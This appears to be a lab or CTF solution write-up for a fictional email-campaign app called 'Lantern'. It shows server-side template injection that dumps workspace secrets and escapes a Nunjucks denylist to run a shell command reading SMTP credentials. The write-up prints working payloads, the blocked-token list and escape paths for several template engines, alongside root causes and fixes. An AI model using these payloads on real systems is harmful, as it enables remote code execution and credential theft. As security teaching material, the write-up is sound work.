# Solution — Lantern

Full spoilers.

```bash
curl -s -c jar -X POST http://localhost:8092/api/session \
  -H 'Content-Type: application/json' \
  -d '{"email":"marketing@brightwell.example","password":"Lantern-Campaigns-2026"}'

preview() {
  curl -s -b jar -X POST http://localhost:8092/api/campaigns/CMP-2026-02-NEWSLETTER/preview \
    -H 'Content-Type: application/json' --data-binary "$1"
}
```

## Confirming it is a template engine, not string replacement

The documented merge tags look like a fixed vocabulary. Test whether they
are:

```bash
preview '{"body":"{{ 7 * 191 }}"}'
# {"rendered":"1337"}
```

Arithmetic evaluated server-side. That single response tells you the body
is compiled, not scanned for known placeholders — everything after this
follows from it.

## Objective 1 — `HxBugLabs{th3_c0nt3xt_1s_wh4t3v3r_y0u_p4ss3d_1t}`

### The bug

Merge tags are property lookups on whatever object the renderer was
handed. Look at what the handler hands it:

```js
const context = {
  recipient: sampleRecipient,
  campaign,
  workspace,                       // ← the whole workspace record
  user: { name, email },
  now: new Date().toISOString(),
};
```

`workspace` is in the documentation only as `{{ workspace.name }}`, for
the footer. The object passed in is the entire record.

### Exploiting it

Do not guess leaf names — dump the object:

```bash
preview '{"body":"{{ workspace | dump }}"}'
```

```json
{
  "id": "WS-BRIGHTWELL",
  "name": "Brightwell Haulage",
  "senderAddress": "hello@brightwell.example",
  "deliveryRegion": "eu-west-1",
  "internalNotes": "Dedicated IP pool since 2025-11.",
  "webhookSigningKey": "whsec_HxBugLabs{th3_c0nt3xt_1s_wh4t3v3r_y0u_p4ss3d_1t}"
}
```

The workspace's webhook signing key — the secret that lets Lantern prove
a webhook came from it — rendered into an email preview. `{{ campaign |
dump }}` and `{{ user | dump }}` are worth the same two seconds.

### Root cause

**The render context is an authorization boundary, and it was populated
by convenience.** Someone needed `workspace.name` in a footer and passed
`workspace`. Every property that object ever gains is now readable by
anyone who can write a template.

The fix is not a filter. It is passing a projection:

```js
const context = {
  recipient: pick(sampleRecipient, ["firstName", "lastName", "company", "email"]),
  workspace: { name: workspace.name, senderAddress: workspace.senderAddress },
};
```

On real targets this is the highest-yield first probe against any
templating feature — long before you try to escape the sandbox, dump
what you were already given. Invoice templates, PDF generators,
notification editors and "custom email" features are routinely handed a
whole ORM model, and a dumped object is a finding on its own that needs
no bypass and no RCE.

## Objective 2 — `HxBugLabs{d3nyl1sts_f1lt3r_str1ngs_n0t_s3m4nt1cs}`

### The control

Anything obvious is refused:

```bash
preview '{"body":"{{ range.constructor(1) }}"}'
```

```json
{"error":"template contains a blocked token: \"constructor\"",
 "blocked":["constructor","process","require","global","child_process",
            "mainModule","__proto__","eval","Function"]}
```

The rejection message hands you the whole list, which is convenient and
also the first thing wrong with it. Read how it is applied:

```js
function screenTemplate(source) {
  const lowered = String(source).toLowerCase();
  const hit = BLOCKED_TOKENS.find((token) => lowered.includes(token.toLowerCase()));
  return hit ? { ok: false, token: hit } : { ok: true };
}
```

It is a substring search over **the template text**. The engine does not
evaluate the template text; it evaluates what the template *computes*.
Everything follows from that gap.

### Step 1: reach the function constructor

Nunjucks resolves `obj[expr]` with whatever `expr` evaluates to, so a
property name can be assembled at render time:

```
range['cons' + 'tructor']
```

The literal `constructor` never appears in the source. `range` is a
built-in global in Nunjucks, and like every JavaScript function its
`.constructor` is `Function` — so this expression is a function
constructor you can hand a string of code to.

### Step 2: get to `process` from inside

The obvious body fails:

```
range['cons'+'tructor']('return this.process...')()
```

`this` inside a `Function`-constructed body called with no receiver is
not the global object here, so `this.process` is undefined. But the body
runs in **global scope**, where `global` is an ordinary identifier — and
the identifier only has to exist at *runtime*, not in your template text.
So build the code string the same way you built the property name:

```
'return ' + 'glo'+'bal.pro'+'cess.mainMod'+'ule.requ'+'ire("child_pro"+"cess")…'
```

Every blocked word is split across a concatenation. `"child_pro"+"cess"`
never contains the string `child_process`; `'pro'+'cess'` never contains
`process`. The screening function sees none of them.

### The payload

```bash
preview '{"body":"{{ range['"'"'cons'"'"'+'"'"'tructor'"'"']('"'"'return '"'"' + '"'"'glo'"'"'+'"'"'bal.pro'"'"'+'"'"'cess.mainMod'"'"'+'"'"'ule.requ'"'"'+'"'"'ire(\"child_pro\"+\"cess\").execSync(\"cat /opt/lantern/smtp.conf\").toString()'"'"')() }}"}'
```

Easier to send from a script than from a shell:

```python
tpl = ("{{ range['cons'+'tructor']('return ' + 'glo'+'bal.pro'+'cess.mainMod'+'ule.requ'"
       "+'ire(\"child_pro\"+\"cess\").execSync(\"cat /opt/lantern/smtp.conf\").toString()')() }}")
```

```
host=smtp.eu.lantern-mail.example
port=587
user=lantern-relay
password=HxBugLabs{d3nyl1sts_f1lt3r_str1ngs_n0t_s3m4nt1cs}
```

Arbitrary command execution as the application user, and the SMTP relay
credentials for the whole platform.

### Root cause

**A denylist over source text, guarding an engine that evaluates
semantics.** There is no list of forbidden strings that survives an
attacker who can concatenate, index, encode, or reverse — and the
template language exists precisely to compute values.

Nothing about this is Nunjucks-specific. The same shape, with different
spellings:

| Engine | Reach the escape via |
| --- | --- |
| Nunjucks / Jinja2 | `range.constructor`, `cycler`, `joiner`, `self.__init__.__globals__` |
| Handlebars | prototype access through helpers and `lookup` |
| Twig | `_self.env.registerUndefinedFilterCallback` |
| Freemarker | `?new()` on `Execute` |
| Velocity | `$class.inspect(...)` |
| ERB / Ruby | `<%= system(...) %>` — no escape needed |

The real fixes, in order of how much they actually buy you:

1. **Do not compile user-authored templates in your process.** A
   marketing template needs merge-tag substitution, not a Turing-complete
   language. Parse a fixed placeholder syntax yourself and substitute
   values.
2. If a real engine is required, run it in a **sandbox that removes
   globals** — a separate process with no `require`, a locked-down
   isolate, or a purpose-built safe subset. Not a word filter.
3. **Pass a projection, never a live model** (objective 1).
4. Treat the denylist as what it is: a speed bump that makes the finding
   slightly slower to write up.

### Finding SSTI on a real target

The probe order that costs the least and tells you the most:

1. `{{7*191}}` and `${7*191}` and `<%= 7*191 %>` in every field that ends
   up in a rendered document, email, PDF, invoice, or notification.
2. If arithmetic evaluates, identify the engine — malformed input and
   error messages usually name it outright.
3. **Dump the context before trying to escape it.** Lower risk, often
   enough for a valid finding on its own.
4. Only then go for the escape, and stop at proof — read one file, do not
   go further.

## Notes for the report

Two findings from one feature. File them together, ordered by severity,
but describe them separately — the fixes are different and land on
different code.

> **Critical — remote code execution via campaign preview.** The preview
> endpoint compiles author-supplied Nunjucks templates in-process. The
> token denylist protecting it is a substring match over template source
> and is bypassed by string concatenation, since the engine evaluates
> computed property names and computed code strings. Demonstrated by
> reading `/opt/lantern/smtp.conf`, which contains the platform's SMTP
> relay password.
>
> **High — workspace secrets exposed to the template context.** The whole
> workspace record, including `webhookSigningKey`, is passed to the
> renderer and readable with `{{ workspace | dump }}`. No bypass needed.

Say exactly what you executed (`cat` on one config file), that you
modified nothing, and recommend rotating the SMTP password and the
webhook signing key. On a real program, the credential you read has to be
treated as compromised the moment it renders — that sentence belongs in
your report, not in their incident review a week later.
